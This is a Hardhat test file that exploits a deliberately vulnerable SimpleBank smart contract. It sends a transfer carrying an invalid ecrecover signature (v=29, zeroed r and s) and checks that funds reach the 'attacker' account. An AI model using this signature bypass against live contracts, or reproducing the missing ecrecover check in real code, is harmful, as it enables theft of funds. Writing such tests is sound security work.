const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('SimpleBank Vulnerability Test Suite', function () {
  let SimpleBank, simpleBank, owner, user1, user2;

  beforeEach(async function () {
    [owner, user1, user2] = await ethers.getSigners();

    // Deploy the vulnerable SimpleBank contract
    SimpleBank = await ethers.getContractFactory('SimpleBank');
    simpleBank = await SimpleBank.deploy();
    await simpleBank.deployed();
  });

  it('should exploit vulnerability when using invalid ecrecover signature', async function () {
    const amount = 100;
    const messageHash = ethers.utils.solidityKeccak256(
      ['address', 'uint256'],
      [user1.address, amount]
    );

    // Generate an invalid signature, v should be 27 or 28, use 29 here
    const invalidV = 29;
    const dummyR = ethers.constants.HashZero;
    const dummyS = ethers.constants.HashZero;

    // Attempt the transfer which should not revert despite invalid signature due to the exploit
    await simpleBank.connect(user1).transfer(user2.address, amount, messageHash, invalidV, dummyR, dummyS);
    
    // Verify that the exploit results in an increased balance for the attacker
    const attackerBalance = await simpleBank.getBalance(user2.address);
    expect(attackerBalance).to.equal(amount);
  });
});